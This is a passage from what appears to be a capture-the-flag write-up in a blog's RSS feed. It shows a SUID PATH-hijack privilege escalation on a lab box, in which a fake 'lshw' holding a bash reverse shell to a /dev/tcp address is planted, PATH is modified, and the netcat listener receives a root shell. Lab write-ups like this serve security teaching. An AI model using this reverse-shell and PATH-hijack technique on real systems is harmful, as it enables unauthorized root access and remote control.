<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
<ul>
<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s env, can be modified</li>
</ul>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
<p>First, I’ll create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and add append one liner bash reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ mkdir iamf
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/bin/lshw
</code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to environment variable <code>$PATH</code>. Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp/iamf:<span class="nv">$PATH</span>
theseus@ubuntu:/tmp$
theseus@ubuntu:/tmp$ which lshw
/tmp/iamf/lshw
</code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary.</p>
<p>However, it then just hangs.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">theseus@ubuntu:/tmp$ <span class="nv">sysinfo</span>
<span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
</code></pre></div><p>That is because it was pwned on my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «magic» «10.10.14.169»
$ nc -nvlp <span class="m">1234</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
connect to <span class="o">[</span>10.10.14.169<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">36094</span>
root@ubuntu:/tmp/iamf# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,100<span class="o">(</span>users<span class="o">)</span>,1000<span class="o">(</span>theseus<span class="o">)</span>
</code></pre></div><center>
<p><div class="img-container"><img src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  /></div>
</p>
</center>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li>
<li><a href="https://exiftool.org/">https://exiftool.org/</a></li>
<li><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
